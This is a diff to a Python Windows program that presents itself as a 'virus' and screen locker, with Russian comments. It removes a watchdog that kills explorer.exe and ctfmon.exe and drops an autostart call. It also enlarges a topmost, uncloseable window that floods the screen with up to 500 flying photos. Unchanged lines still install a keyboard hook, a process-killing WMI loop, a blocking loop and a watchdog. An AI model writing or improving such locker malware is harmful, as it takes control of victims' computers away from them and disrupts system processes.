@@ -731,37 +731,6 @@ def wmi_kill_loop():
         except Exception:
             pass
 
-
-def _system_explorer_pids():
-    pids = []
-    for p in psutil.process_iter(["name", "exe", "pid"]):
-        try:
-            if (p.info.get("name") or "").lower() != "explorer.exe":
-                continue
-            exe = (p.info.get("exe") or "").lower()
-            if "appdata" in exe:
-                continue
-            pids.append(p.info["pid"])
-        except Exception:
-            pass
-    return pids
-
-
-def desktop_watchdog():
-    while not _STOP_FLAG.is_set():
-        for pid in _system_explorer_pids():
-            try:
-                psutil.Process(pid).kill()
-            except Exception:
-                pass
-        for name in ("ctfmon.exe",):
-            try:
-                subprocess.run(["taskkill", "/f", "/im", name],
-                               capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=5)
-            except Exception:
-                pass
-        time.sleep(2.0)
-
 # ================= WATCHDOG =================
 def _parent_alive(pid):
     try:
@@ -886,23 +855,34 @@ def init_scream():
 
 # ================= FLYING PHOTOS VIRUS =================
 def flying_photos_virus(parent_win):
-    """Окно с летающими фотками, которые размножаются каждые 2 сек (до 50), быстрые."""
+    """Окно поверх рабочего стола: 15 стартовых фоток, размножение до 500, быстрые."""
     import tkinter as tk
     from PIL import Image, ImageTk
 
+    # Скрываем локер, чтобы был виден рабочий стол под вирусом
+    try:
+        parent_win.withdraw()
+    except Exception:
+        pass
+
     vwin = tk.Toplevel(parent_win)
     vwin.title("...")
-    vwin.attributes("-fullscreen", True)
+    # НЕ fullscreen, чтобы рабочий стол был виден
+    sw = vwin.winfo_screenwidth()
+    sh = vwin.winfo_screenheight()
+    w = int(sw * 0.9)
+    h = int(sh * 0.9)
+    x = (sw - w) // 2
+    y = (sh - h) // 2
+    vwin.geometry(f"{w}x{h}+{x}+{y}")
     vwin.attributes("-topmost", True)
+    vwin.attributes("-alpha", 0.85)  # полупрозрачное — рабочий стол просвечивает
     vwin.configure(bg="#000000")
     vwin.protocol("WM_DELETE_WINDOW", lambda: None)
     vwin.lift()
     vwin.focus_force()
 
-    sw = vwin.winfo_screenwidth()
-    sh = vwin.winfo_screenheight()
-
-    canvas = tk.Canvas(vwin, width=sw, height=sh, bg="#000000", highlightthickness=0)
+    canvas = tk.Canvas(vwin, width=w, height=h, bg="#000000", highlightthickness=0)
     canvas.pack(fill="both", expand=True)
 
     pil_photos = []
@@ -921,8 +901,9 @@ def flying_photos_virus(parent_win):
             return
 
     SIZE = 200
-    MAX_PHOTOS = 50
-    SPAWN_INTERVAL_MS = 2000
+    MAX_PHOTOS = 500
+    START_PHOTOS = 15
+    SPAWN_INTERVAL_MS = 300
     SPEED_CHOICES = [-25, -22, -18, -15, -12, -10, 10, 12, 15, 18, 22, 25]
 
     items = []
@@ -934,15 +915,16 @@ def flying_photos_virus(parent_win):
         pil = random.choice(pil_photos)
         photo = ImageTk.PhotoImage(pil)
         tk_refs.append(photo)
-        x = random.randint(0, max(1, sw - SIZE))
-        y = random.randint(0, max(1, sh - SIZE))
-        item = canvas.create_image(x, y, image=photo, anchor="nw")
+        px = random.randint(0, max(1, w - SIZE))
+        py = random.randint(0, max(1, h - SIZE))
+        item = canvas.create_image(px, py, image=photo, anchor="nw")
         dx = random.choice(SPEED_CHOICES)
         dy = random.choice(SPEED_CHOICES)
-        items.append({"id": item, "x": x, "y": y, "dx": dx, "dy": dy})
+        items.append({"id": item, "x": px, "y": py, "dx": dx, "dy": dy})
 
-    spawn_one()
-    spawn_one()
+    # Стартуем с 15 фоток
+    for _ in range(START_PHOTOS):
+        spawn_one()
 
     def spawn_loop():
         spawn_one()
@@ -952,12 +934,12 @@ def flying_photos_virus(parent_win):
         for it in items:
             it["x"] += it["dx"]
             it["y"] += it["dy"]
-            if it["x"] <= 0 or it["x"] >= sw - SIZE:
+            if it["x"] <= 0 or it["x"] >= w - SIZE:
                 it["dx"] = -it["dx"]
-                it["x"] = max(0, min(it["x"], sw - SIZE))
-            if it["y"] <= 0 or it["y"] >= sh - SIZE:
+                it["x"] = max(0, min(it["x"], w - SIZE))
+            if it["y"] <= 0 or it["y"] >= h - SIZE:
                 it["dy"] = -it["dy"]
-                it["y"] = max(0, min(it["y"], sh - SIZE))
+                it["y"] = max(0, min(it["y"], h - SIZE))
             canvas.coords(it["id"], it["x"], it["y"])
         vwin.after(16, animate)
 
@@ -1037,7 +1019,6 @@ def run_ui():
             return
         state["virus_started"] = True
         install_keyboard_hook()
-        install_autostart()
         spawn_watchdog()
         flying_photos_virus(win)
         threading.Thread(target=_virus_timer_worker, daemon=True).start()
@@ -1095,7 +1076,6 @@ def main():
 
     threading.Thread(target=blocking_loop, daemon=True).start()
     threading.Thread(target=wmi_kill_loop, daemon=True).start()
-    threading.Thread(target=desktop_watchdog, daemon=True).start()
 
     run_ui()
 
